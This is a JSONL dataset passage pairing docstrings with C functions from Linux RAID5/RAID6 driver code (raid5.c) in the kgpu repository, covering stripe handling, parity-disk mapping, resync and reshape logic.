"other", "language": "c", "size": 1279}
{"docstring": "/*\n * Each stripe/dev can have one or more bion attached.\n * toread/towrite point to the first in a chain.\n * The bi_next chain must be in order.\n */\n", "func_signal": "static int add_stripe_bio(struct stripe_head *sh, struct bio *bi, int dd_idx, int forwrite)", "code": "{\n\tstruct bio **bip;\n\traid5_conf_t *conf = sh->raid_conf;\n\tint firstwrite=0;\n\n\tpr_debug(\"adding bh b#%llu to stripe s#%llu\\n\",\n\t\t(unsigned long long)bi->bi_sector,\n\t\t(unsigned long long)sh->sector);\n\n\n\tspin_lock(&sh->lock);\n\tspin_lock_irq(&conf->device_lock);\n\tif (forwrite) {\n\t\tbip = &sh->dev[dd_idx].towrite;\n\t\tif (*bip == NULL && sh->dev[dd_idx].written == NULL)\n\t\t\tfirstwrite = 1;\n\t} else\n\t\tbip = &sh->dev[dd_idx].toread;\n\twhile (*bip && (*bip)->bi_sector < bi->bi_sector) {\n\t\tif ((*bip)->bi_sector + ((*bip)->bi_size >> 9) > bi->bi_sector)\n\t\t\tgoto overlap;\n\t\tbip = & (*bip)->bi_next;\n\t}\n\tif (*bip && (*bip)->bi_sector < bi->bi_sector + ((bi->bi_size)>>9))\n\t\tgoto overlap;\n\n\tBUG_ON(*bip && bi->bi_next && (*bip) != bi->bi_next);\n\tif (*bip)\n\t\tbi->bi_next = *bip;\n\t*bip = bi;\n\tbi->bi_phys_segments++;\n\tspin_unlock_irq(&conf->device_lock);\n\tspin_unlock(&sh->lock);\n\n\tpr_debug(\"added bi b#%llu to stripe s#%llu, disk %d.\\n\",\n\t\t(unsigned long long)bi->bi_sector,\n\t\t(unsigned long long)sh->sector, dd_idx);\n\n\tif (conf->mddev->bitmap && firstwrite) {\n\t\tbitmap_startwrite(conf->mddev->bitmap, sh->sector,\n\t\t\t\t  STRIPE_SECTORS, 0);\n\t\tsh->bm_seq = conf->seq_flush+1;\n\t\tset_bit(STRIPE_BIT_DELAY, &sh->state);\n\t}\n\n\tif (forwrite) {\n\t\t/* check if page is covered */\n\t\tsector_t sector = sh->dev[dd_idx].sector;\n\t\tfor (bi=sh->dev[dd_idx].towrite;\n\t\t     sector < sh->dev[dd_idx].sector + STRIPE_SECTORS &&\n\t\t\t     bi && bi->bi_sector <= sector;\n\t\t     bi = r5_next_bio(bi, sh->dev[dd_idx].sector)) {\n\t\t\tif (bi->bi_sector + (bi->bi_size>>9) >= sector)\n\t\t\t\tsector = bi->bi_sector + (bi->bi_size>>9);\n\t\t}\n\t\tif (sector >= sh->dev[dd_idx].sector + STRIPE_SECTORS)\n\t\t\tset_bit(R5_OVERWRITE, &sh->dev[dd_idx].flags);\n\t}\n\treturn 1;\n\n overlap:\n\tset_bit(R5_Overlap, &sh->dev[dd_idx].flags);\n\tspin_unlock_irq(&conf->device_lock);\n\tspin_unlock(&sh->lock);\n\treturn 0;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* fetch_block6 - checks the given member device to see if its data needs\n * to be read or computed to satisfy a request.\n *\n * Returns 1 when no more member devices need to be checked, otherwise returns\n * 0 to tell the loop in handle_stripe_fill6 to continue\n */\n", "func_signal": "static int fetch_block6(struct stripe_head *sh, struct stripe_head_state *s,\n\t\t\t struct r6_state *r6s, int disk_idx, int disks)", "code": "{\n\tstruct r5dev *dev = &sh->dev[disk_idx];\n\tstruct r5dev *fdev[2] = { &sh->dev[r6s->failed_num[0]],\n\t\t\t\t  &sh->dev[r6s->failed_num[1]] };\n\n\tif (!test_bit(R5_LOCKED, &dev->flags) &&\n\t    !test_bit(R5_UPTODATE, &dev->flags) &&\n\t    (dev->toread ||\n\t     (dev->towrite && !test_bit(R5_OVERWRITE, &dev->flags)) ||\n\t     s->syncing || s->expanding ||\n\t     (s->failed >= 1 &&\n\t      (fdev[0]->toread || s->to_write)) ||\n\t     (s->failed >= 2 &&\n\t      (fdev[1]->toread || s->to_write)))) {\n\t\t/* we would like to get this block, possibly by computing it,\n\t\t * otherwise read it if the backing disk is insync\n\t\t */\n\t\tBUG_ON(test_bit(R5_Wantcompute, &dev->flags));\n\t\tBUG_ON(test_bit(R5_Wantread, &dev->flags));\n\t\tif ((s->uptodate == disks - 1) &&\n\t\t    (s->failed && (disk_idx == r6s->failed_num[0] ||\n\t\t\t\t   disk_idx == r6s->failed_num[1]))) {\n\t\t\t/* have disk failed, and we're requested to fetch it;\n\t\t\t * do compute it\n\t\t\t */\n\t\t\tpr_debug(\"Computing stripe %llu block %d\\n\",\n\t\t\t       (unsigned long long)sh->sector, disk_idx);\n\t\t\tset_bit(STRIPE_COMPUTE_RUN, &sh->state);\n\t\t\tset_bit(STRIPE_OP_COMPUTE_BLK, &s->ops_request);\n\t\t\tset_bit(R5_Wantcompute, &dev->flags);\n\t\t\tsh->ops.target = disk_idx;\n\t\t\tsh->ops.target2 = -1; /* no 2nd target */\n\t\t\ts->req_compute = 1;\n\t\t\ts->uptodate++;\n\t\t\treturn 1;\n\t\t} else if (s->uptodate == disks-2 && s->failed >= 2) {\n\t\t\t/* Computing 2-failure is *very* expensive; only\n\t\t\t * do it if failed >= 2\n\t\t\t */\n\t\t\tint other;\n\t\t\tfor (other = disks; other--; ) {\n\t\t\t\tif (other == disk_idx)\n\t\t\t\t\tcontinue;\n\t\t\t\tif (!test_bit(R5_UPTODATE,\n\t\t\t\t      &sh->dev[other].flags))\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tBUG_ON(other < 0);\n\t\t\tpr_debug(\"Computing stripe %llu blocks %d,%d\\n\",\n\t\t\t       (unsigned long long)sh->sector,\n\t\t\t       disk_idx, other);\n\t\t\tset_bit(STRIPE_COMPUTE_RUN, &sh->state);\n\t\t\tset_bit(STRIPE_OP_COMPUTE_BLK, &s->ops_request);\n\t\t\tset_bit(R5_Wantcompute, &sh->dev[disk_idx].flags);\n\t\t\tset_bit(R5_Wantcompute, &sh->dev[other].flags);\n\t\t\tsh->ops.target = disk_idx;\n\t\t\tsh->ops.target2 = other;\n\t\t\ts->uptodate += 2;\n\t\t\ts->req_compute = 1;\n\t\t\treturn 1;\n\t\t} else if (test_bit(R5_Insync, &dev->flags)) {\n\t\t\tset_bit(R5_LOCKED, &dev->flags);\n\t\t\tset_bit(R5_Wantread, &dev->flags);\n\t\t\ts->locked++;\n\t\t\tpr_debug(\"Reading block %d (sync=%d)\\n\",\n\t\t\t\tdisk_idx, s->syncing);\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* This is called from the reshape thread and should make any\n * changes needed in 'conf'\n */\n", "func_signal": "static void end_reshape(raid5_conf_t *conf)", "code": "{\n\n\tif (!test_bit(MD_RECOVERY_INTR, &conf->mddev->recovery)) {\n\n\t\tspin_lock_irq(&conf->device_lock);\n\t\tconf->previous_raid_disks = conf->raid_disks;\n\t\tconf->reshape_progress = MaxSector;\n\t\tspin_unlock_irq(&conf->device_lock);\n\t\twake_up(&conf->wait_for_overlap);\n\n\t\t/* read-ahead size must cover two whole stripes, which is\n\t\t * 2 * (datadisks) * chunksize where 'n' is the number of raid devices\n\t\t */\n\t\tif (conf->mddev->queue) {\n\t\t\tint data_disks = conf->raid_disks - conf->max_degraded;\n\t\t\tint stripe = data_disks * ((conf->chunk_sectors << 9)\n\t\t\t\t\t\t   / PAGE_SIZE);\n\t\t\tif (conf->mddev->queue->backing_dev_info.ra_pages < 2 * stripe)\n\t\t\t\tconf->mddev->queue->backing_dev_info.ra_pages = 2 * stripe;\n\t\t}\n\t}\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/*\n *  add bio to the retry LIFO  ( in O(1) ... we are in interrupt )\n *  later sampled by raid5d.\n */\n", "func_signal": "static void add_bio_to_retry(struct bio *bi,raid5_conf_t *conf)", "code": "{\n\tunsigned long flags;\n\n\tspin_lock_irqsave(&conf->device_lock, flags);\n\n\tbi->bi_next = conf->retry_read_aligned_list;\n\tconf->retry_read_aligned_list = bi;\n\n\tspin_unlock_irqrestore(&conf->device_lock, flags);\n\tmd_wakeup_thread(conf->mddev->thread);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* handle_stripe_clean_event\n * any written block on an uptodate or failed drive can be returned.\n * Note that if we 'wrote' to a failed drive, it will be UPTODATE, but\n * never LOCKED, so we don't need to test 'failed' directly.\n */\n", "func_signal": "static void handle_stripe_clean_event(raid5_conf_t *conf,\n\tstruct stripe_head *sh, int disks, struct bio **return_bi)", "code": "{\n\tint i;\n\tstruct r5dev *dev;\n\n\tfor (i = disks; i--; )\n\t\tif (sh->dev[i].written) {\n\t\t\tdev = &sh->dev[i];\n\t\t\tif (!test_bit(R5_LOCKED, &dev->flags) &&\n\t\t\t\ttest_bit(R5_UPTODATE, &dev->flags)) {\n\t\t\t\t/* We can return any write requests */\n\t\t\t\tstruct bio *wbi, *wbi2;\n\t\t\t\tint bitmap_end = 0;\n\t\t\t\tpr_debug(\"Return write for disc %d\\n\", i);\n\t\t\t\tspin_lock_irq(&conf->device_lock);\n\t\t\t\twbi = dev->written;\n\t\t\t\tdev->written = NULL;\n\t\t\t\twhile (wbi && wbi->bi_sector <\n\t\t\t\t\tdev->sector + STRIPE_SECTORS) {\n\t\t\t\t\twbi2 = r5_next_bio(wbi, dev->sector);\n\t\t\t\t\tif (!raid5_dec_bi_phys_segments(wbi)) {\n\t\t\t\t\t\tmd_write_end(conf->mddev);\n\t\t\t\t\t\twbi->bi_next = *return_bi;\n\t\t\t\t\t\t*return_bi = wbi;\n\t\t\t\t\t}\n\t\t\t\t\twbi = wbi2;\n\t\t\t\t}\n\t\t\t\tif (dev->towrite == NULL)\n\t\t\t\t\tbitmap_end = 1;\n\t\t\t\tspin_unlock_irq(&conf->device_lock);\n\t\t\t\tif (bitmap_end)\n\t\t\t\t\tbitmap_endwrite(conf->mddev->bitmap,\n\t\t\t\t\t\t\tsh->sector,\n\t\t\t\t\t\t\tSTRIPE_SECTORS,\n\t\t\t\t\t !test_bit(STRIPE_DEGRADED, &sh->state),\n\t\t\t\t\t\t\t0);\n\t\t\t}\n\t\t}\n\n\tif (test_and_clear_bit(STRIPE_FULL_WRITE, &sh->state))\n\t\tif (atomic_dec_and_test(&conf->pending_full_writes))\n\t\t\tmd_wakeup_thread(conf->mddev->thread);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* FIXME go_faster isn't used */\n", "func_signal": "static inline sector_t sync_request(mddev_t *mddev, sector_t sector_nr, int *skipped, int go_faster)", "code": "{\n\traid5_conf_t *conf = mddev->private;\n\tstruct stripe_head *sh;\n\tsector_t max_sector = mddev->dev_sectors;\n\tsector_t sync_blocks;\n\tint still_degraded = 0;\n\tint i;\n\n\tif (sector_nr >= max_sector) {\n\t\t/* just being told to finish up .. nothing much to do */\n\n\t\tif (test_bit(MD_RECOVERY_RESHAPE, &mddev->recovery)) {\n\t\t\tend_reshape(conf);\n\t\t\treturn 0;\n\t\t}\n\n\t\tif (mddev->curr_resync < max_sector) /* aborted */\n\t\t\tbitmap_end_sync(mddev->bitmap, mddev->curr_resync,\n\t\t\t\t\t&sync_blocks, 1);\n\t\telse /* completed sync */\n\t\t\tconf->fullsync = 0;\n\t\tbitmap_close_sync(mddev->bitmap);\n\n\t\treturn 0;\n\t}\n\n\t/* Allow raid5_quiesce to complete */\n\twait_event(conf->wait_for_overlap, conf->quiesce != 2);\n\n\tif (test_bit(MD_RECOVERY_RESHAPE, &mddev->recovery))\n\t\treturn reshape_request(mddev, sector_nr, skipped);\n\n\t/* No need to check resync_max as we never do more than one\n\t * stripe, and as resync_max will always be on a chunk boundary,\n\t * if the check in md_do_sync didn't fire, there is no chance\n\t * of overstepping resync_max here\n\t */\n\n\t/* if there is too many failed drives and we are trying\n\t * to resync, then assert that we are finished, because there is\n\t * nothing we can do.\n\t */\n\tif (mddev->degraded >= conf->max_degraded &&\n\t    test_bit(MD_RECOVERY_SYNC, &mddev->recovery)) {\n\t\tsector_t rv = mddev->dev_sectors - sector_nr;\n\t\t*skipped = 1;\n\t\treturn rv;\n\t}\n\tif (!bitmap_start_sync(mddev->bitmap, sector_nr, &sync_blocks, 1) &&\n\t    !test_bit(MD_RECOVERY_REQUESTED, &mddev->recovery) &&\n\t    !conf->fullsync && sync_blocks >= STRIPE_SECTORS) {\n\t\t/* we can skip this block, and probably more */\n\t\tsync_blocks /= STRIPE_SECTORS;\n\t\t*skipped = 1;\n\t\treturn sync_blocks * STRIPE_SECTORS; /* keep things rounded to whole stripes */\n\t}\n\n\n\tbitmap_cond_end_sync(mddev->bitmap, sector_nr);\n\n\tsh = get_active_stripe(conf, sector_nr, 0, 1, 0);\n\tif (sh == NULL) {\n\t\tsh = get_active_stripe(conf, sector_nr, 0, 0, 0);\n\t\t/* make sure we don't swamp the stripe cache if someone else\n\t\t * is trying to get access\n\t\t */\n\t\tschedule_timeout_uninterruptible(1);\n\t}\n\t/* Need to check if array will still be degraded after recovery/resync\n\t * We don't need to check the 'failed' flag as when that gets set,\n\t * recovery aborts.\n\t */\n\tfor (i = 0; i < conf->raid_disks; i++)\n\t\tif (conf->disks[i].rdev == NULL)\n\t\t\tstill_degraded = 1;\n\n\tbitmap_start_sync(mddev->bitmap, sector_nr, &sync_blocks, still_degraded);\n\n\tspin_lock(&sh->lock);\n\tset_bit(STRIPE_SYNCING, &sh->state);\n\tclear_bit(STRIPE_INSYNC, &sh->state);\n\tspin_unlock(&sh->lock);\n\n\thandle_stripe(sh);\n\trelease_stripe(sh);\n\n\treturn STRIPE_SECTORS;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/*\n * Need to check if array has failed when deciding whether to:\n *  - start an array\n *  - remove non-faulty devices\n *  - add a spare\n *  - allow a reshape\n * This determination is simple when no reshape is happening.\n * However if there is a reshape, we need to carefully check\n * both the before and after sections.\n * This is because some failed devices may only affect one\n * of the two sections, and some non-in_sync devices may\n * be insync in the section most affected by failed devices.\n */\n", "func_signal": "static int has_failed(raid5_conf_t *conf)", "code": "{\n\tint degraded;\n\tint i;\n\tif (conf->mddev->reshape_position == MaxSector)\n\t\treturn conf->mddev->degraded > conf->max_degraded;\n\n\trcu_read_lock();\n\tdegraded = 0;\n\tfor (i = 0; i < conf->previous_raid_disks; i++) {\n\t\tmdk_rdev_t *rdev = rcu_dereference(conf->disks[i].rdev);\n\t\tif (!rdev || test_bit(Faulty, &rdev->flags))\n\t\t\tdegraded++;\n\t\telse if (test_bit(In_sync, &rdev->flags))\n\t\t\t;\n\t\telse\n\t\t\t/* not in-sync or faulty.\n\t\t\t * If the reshape increases the number of devices,\n\t\t\t * this is being recovered by the reshape, so\n\t\t\t * this 'previous' section is not in_sync.\n\t\t\t * If the number of devices is being reduced however,\n\t\t\t * the device can only be part of the array if\n\t\t\t * we are reverting a reshape, so this section will\n\t\t\t * be in-sync.\n\t\t\t */\n\t\t\tif (conf->raid_disks >= conf->previous_raid_disks)\n\t\t\t\tdegraded++;\n\t}\n\trcu_read_unlock();\n\tif (degraded > conf->max_degraded)\n\t\treturn 1;\n\trcu_read_lock();\n\tdegraded = 0;\n\tfor (i = 0; i < conf->raid_disks; i++) {\n\t\tmdk_rdev_t *rdev = rcu_dereference(conf->disks[i].rdev);\n\t\tif (!rdev || test_bit(Faulty, &rdev->flags))\n\t\t\tdegraded++;\n\t\telse if (test_bit(In_sync, &rdev->flags))\n\t\t\t;\n\t\telse\n\t\t\t/* not in-sync or faulty.\n\t\t\t * If reshape increases the number of devices, this\n\t\t\t * section has already been recovered, else it\n\t\t\t * almost certainly hasn't.\n\t\t\t */\n\t\t\tif (conf->raid_disks <= conf->previous_raid_disks)\n\t\t\t\tdegraded++;\n\t}\n\trcu_read_unlock();\n\tif (degraded > conf->max_degraded)\n\t\treturn 1;\n\treturn 0;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* find an idle stripe, make sure it is unhashed, and return it. */\n", "func_signal": "static struct stripe_head *get_free_stripe(raid5_conf_t *conf)", "code": "{\n\tstruct stripe_head *sh = NULL;\n\tstruct list_head *first;\n\n\tCHECK_DEVLOCK();\n\tif (list_empty(&conf->inactive_list))\n\t\tgoto out;\n\tfirst = conf->inactive_list.next;\n\tsh = list_entry(first, struct stripe_head, lru);\n\tlist_del_init(first);\n\tremove_hash(sh);\n\tatomic_inc(&conf->active_stripes);\nout:\n\treturn sh;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* set_syndrome_sources - populate source buffers for gen_syndrome\n * @srcs - (struct page *) array of size sh->disks\n * @sh - stripe_head to parse\n *\n * Populates srcs in proper layout order for the stripe and returns the\n * 'count' of sources to be used in a call to async_gen_syndrome.  The P\n * destination buffer is recorded in srcs[count] and the Q destination\n * is recorded in srcs[count+1]].\n */\n", "func_signal": "static int set_syndrome_sources(struct page **srcs, struct stripe_head *sh)", "code": "{\n\tint disks = sh->disks;\n\tint syndrome_disks = sh->ddf_layout ? disks : (disks - 2);\n\tint d0_idx = raid6_d0(sh);\n\tint count;\n\tint i;\n\n\tfor (i = 0; i < disks; i++)\n\t\tsrcs[i] = NULL;\n\n\tcount = 0;\n\ti = d0_idx;\n\tdo {\n\t\tint slot = raid6_idx_to_slot(i, sh, &count, syndrome_disks);\n\n\t\tsrcs[slot] = sh->dev[i].page;\n\t\ti = raid6_next_disk(i, disks);\n\t} while (i != d0_idx);\n\n\treturn syndrome_disks;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* When walking through the disks in a raid5, starting at raid6_d0,\n * We need to map each disk to a 'slot', where the data disks are slot\n * 0 .. raid_disks-3, the parity disk is raid_disks-2 and the Q disk\n * is raid_disks-1.  This help does that mapping.\n */\n", "func_signal": "static int raid6_idx_to_slot(int idx, struct stripe_head *sh,\n\t\t\t     int *count, int syndrome_disks)", "code": "{\n\tint slot = *count;\n\n\tif (sh->ddf_layout)\n\t\t(*count)++;\n\tif (idx == sh->pd_idx)\n\t\treturn syndrome_disks;\n\tif (idx == sh->qd_idx)\n\t\treturn syndrome_disks + 1;\n\tif (!sh->ddf_layout)\n\t\t(*count)++;\n\treturn slot;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/*\n * Input: a 'big' sector number,\n * Output: index of the data and parity disk, and the sector # in them.\n */\n", "func_signal": "static sector_t raid5_compute_sector(raid5_conf_t *conf, sector_t r_sector,\n\t\t\t\t     int previous, int *dd_idx,\n\t\t\t\t     struct stripe_head *sh)", "code": "{\n\tsector_t stripe, stripe2;\n\tsector_t chunk_number;\n\tunsigned int chunk_offset;\n\tint pd_idx, qd_idx;\n\tint ddf_layout = 0;\n\tsector_t new_sector;\n\tint algorithm = previous ? conf->prev_algo\n\t\t\t\t : conf->algorithm;\n\tint sectors_per_chunk = previous ? conf->prev_chunk_sectors\n\t\t\t\t\t : conf->chunk_sectors;\n\tint raid_disks = previous ? conf->previous_raid_disks\n\t\t\t\t  : conf->raid_disks;\n\tint data_disks = raid_disks - conf->max_degraded;\n\n\t/* First compute the information on this sector */\n\n\t/*\n\t * Compute the chunk number and the sector offset inside the chunk\n\t */\n\tchunk_offset = sector_div(r_sector, sectors_per_chunk);\n\tchunk_number = r_sector;\n\n\t/*\n\t * Compute the stripe number\n\t */\n\tstripe = chunk_number;\n\t*dd_idx = sector_div(stripe, data_disks);\n\tstripe2 = stripe;\n\t/*\n\t * Select the parity disk based on the user selected algorithm.\n\t */\n\tpd_idx = qd_idx = ~0;\n\tswitch(conf->level) {\n\tcase 4:\n\t\tpd_idx = data_disks;\n\t\tbreak;\n\tcase 5:\n\t\tswitch (algorithm) {\n\t\tcase ALGORITHM_LEFT_ASYMMETRIC:\n\t\t\tpd_idx = data_disks - sector_div(stripe2, raid_disks);\n\t\t\tif (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx)++;\n\t\t\tbreak;\n\t\tcase ALGORITHM_RIGHT_ASYMMETRIC:\n\t\t\tpd_idx = sector_div(stripe2, raid_disks);\n\t\t\tif (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx)++;\n\t\t\tbreak;\n\t\tcase ALGORITHM_LEFT_SYMMETRIC:\n\t\t\tpd_idx = data_disks - sector_div(stripe2, raid_disks);\n\t\t\t*dd_idx = (pd_idx + 1 + *dd_idx) % raid_disks;\n\t\t\tbreak;\n\t\tcase ALGORITHM_RIGHT_SYMMETRIC:\n\t\t\tpd_idx = sector_div(stripe2, raid_disks);\n\t\t\t*dd_idx = (pd_idx + 1 + *dd_idx) % raid_disks;\n\t\t\tbreak;\n\t\tcase ALGORITHM_PARITY_0:\n\t\t\tpd_idx = 0;\n\t\t\t(*dd_idx)++;\n\t\t\tbreak;\n\t\tcase ALGORITHM_PARITY_N:\n\t\t\tpd_idx = data_disks;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tBUG();\n\t\t}\n\t\tbreak;\n\tcase 6:\n\n\t\tswitch (algorithm) {\n\t\tcase ALGORITHM_LEFT_ASYMMETRIC:\n\t\t\tif (force_n)\n\t\t\t\tgoto use_n;\n\t\t\tpd_idx = raid_disks - 1 - sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = pd_idx + 1;\n\t\t\tif (pd_idx == raid_disks-1) {\n\t\t\t\t(*dd_idx)++;\t/* Q D D D P */\n\t\t\t\tqd_idx = 0;\n\t\t\t} else if (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx) += 2; /* D D P Q D */\n\t\t\tbreak;\n\t\tcase ALGORITHM_RIGHT_ASYMMETRIC:\n\t\t\tpd_idx = sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = pd_idx + 1;\n\t\t\tif (pd_idx == raid_disks-1) {\n\t\t\t\t(*dd_idx)++;\t/* Q D D D P */\n\t\t\t\tqd_idx = 0;\n\t\t\t} else if (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx) += 2; /* D D P Q D */\n\t\t\tbreak;\n\t\tcase ALGORITHM_LEFT_SYMMETRIC:\n\t\t\tpd_idx = raid_disks - 1 - sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = (pd_idx + 1) % raid_disks;\n\t\t\t*dd_idx = (pd_idx + 2 + *dd_idx) % raid_disks;\n\t\t\tbreak;\n\t\tcase ALGORITHM_RIGHT_SYMMETRIC:\n\t\t\tpd_idx = sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = (pd_idx + 1) % raid_disks;\n\t\t\t*dd_idx = (pd_idx + 2 + *dd_idx) % raid_disks;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_PARITY_0:\n\t\t\tpd_idx = 0;\n\t\t\tqd_idx = 1;\n\t\t\t(*dd_idx) += 2;\n\t\t\tbreak;\n\t\tcase ALGORITHM_PARITY_N:\n\t\tuse_n:\n\t\t\tpd_idx = data_disks;\n\t\t\tqd_idx = data_disks + 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_ROTATING_ZERO_RESTART:\n\t\t\t/* Exactly the same as RIGHT_ASYMMETRIC, but or\n\t\t\t * of blocks for computing Q is different.\n\t\t\t */\n\t\t\tpd_idx = sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = pd_idx + 1;\n\t\t\tif (pd_idx == raid_disks-1) {\n\t\t\t\t(*dd_idx)++;\t/* Q D D D P */\n\t\t\t\tqd_idx = 0;\n\t\t\t} else if (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx) += 2; /* D D P Q D */\n\t\t\tddf_layout = 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_ROTATING_N_RESTART:\n\t\t\t/* Same a left_asymmetric, by first stripe is\n\t\t\t * D D D P Q  rather than\n\t\t\t * Q D D D P\n\t\t\t */\n\t\t\tstripe2 += 1;\n\t\t\tpd_idx = raid_disks - 1 - sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = pd_idx + 1;\n\t\t\tif (pd_idx == raid_disks-1) {\n\t\t\t\t(*dd_idx)++;\t/* Q D D D P */\n\t\t\t\tqd_idx = 0;\n\t\t\t} else if (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx) += 2; /* D D P Q D */\n\t\t\tddf_layout = 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_ROTATING_N_CONTINUE:\n\t\t\t/* Same as left_symmetric but Q is before P */\n\t\t\tpd_idx = raid_disks - 1 - sector_div(stripe2, raid_disks);\n\t\t\tqd_idx = (pd_idx + raid_disks - 1) % raid_disks;\n\t\t\t*dd_idx = (pd_idx + 1 + *dd_idx) % raid_disks;\n\t\t\tddf_layout = 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_LEFT_ASYMMETRIC_6:\n\t\t\t/* RAID5 left_asymmetric, with Q on last device */\n\t\t\tif (force_n)\n\t\t\t\tgoto use_n;\n\t\t\tpd_idx = data_disks - sector_div(stripe2, raid_disks-1);\n\t\t\tif (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx)++;\n\t\t\tqd_idx = raid_disks - 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_RIGHT_ASYMMETRIC_6:\n\t\t\tpd_idx = sector_div(stripe2, raid_disks-1);\n\t\t\tif (*dd_idx >= pd_idx)\n\t\t\t\t(*dd_idx)++;\n\t\t\tqd_idx = raid_disks - 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_LEFT_SYMMETRIC_6:\n\t\t\tpd_idx = data_disks - sector_div(stripe2, raid_disks-1);\n\t\t\t*dd_idx = (pd_idx + 1 + *dd_idx) % (raid_disks-1);\n\t\t\tqd_idx = raid_disks - 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_RIGHT_SYMMETRIC_6:\n\t\t\tpd_idx = sector_div(stripe2, raid_disks-1);\n\t\t\t*dd_idx = (pd_idx + 1 + *dd_idx) % (raid_disks-1);\n\t\t\tqd_idx = raid_disks - 1;\n\t\t\tbreak;\n\n\t\tcase ALGORITHM_PARITY_0_6:\n\t\t\tpd_idx = 0;\n\t\t\t(*dd_idx)++;\n\t\t\tqd_idx = raid_disks - 1;\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tBUG();\n\t\t}\n\t\tbreak;\n\t}\n\n\tif (sh) {\n\t\tsh->pd_idx = pd_idx;\n\t\tsh->qd_idx = qd_idx;\n\t\tsh->ddf_layout = ddf_layout;\n\t}\n\t/*\n\t * Finally, compute the new sector number\n\t */\n\tnew_sector = (sector_t)stripe * sectors_per_chunk + chunk_offset;\n\treturn new_sector;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/**\n * handle_stripe_fill5 - read or compute data to satisfy pending requests.\n */\n", "func_signal": "static void handle_stripe_fill5(struct stripe_head *sh,\n\t\t\tstruct stripe_head_state *s, int disks)", "code": "{\n\tint i;\n\n\t/* look for blocks to read/compute, skip this if a compute\n\t * is already in flight, or if the stripe contents are in the\n\t * midst of changing due to a write\n\t */\n\tif (!test_bit(STRIPE_COMPUTE_RUN, &sh->state) && !sh->check_state &&\n\t    !sh->reconstruct_state)\n\t\tfor (i = disks; i--; )\n\t\t\tif (fetch_block5(sh, s, i, disks))\n\t\t\t\tbreak;\n\tset_bit(STRIPE_HANDLE, &sh->state);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/**\n * handle_stripe_fill6 - read or compute data to satisfy pending requests.\n */\n", "func_signal": "static void handle_stripe_fill6(struct stripe_head *sh,\n\t\t\tstruct stripe_head_state *s, struct r6_state *r6s,\n\t\t\tint disks)", "code": "{\n\tint i;\n\n\t/* look for blocks to read/compute, skip this if a compute\n\t * is already in flight, or if the stripe contents are in the\n\t * midst of changing due to a write\n\t */\n\tif (!test_bit(STRIPE_COMPUTE_RUN, &sh->state) && !sh->check_state &&\n\t    !sh->reconstruct_state)\n\t\tfor (i = disks; i--; )\n\t\t\tif (fetch_block6(sh, s, r6s, i, disks))\n\t\t\t\tbreak;\n\tset_bit(STRIPE_HANDLE, &sh->state);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
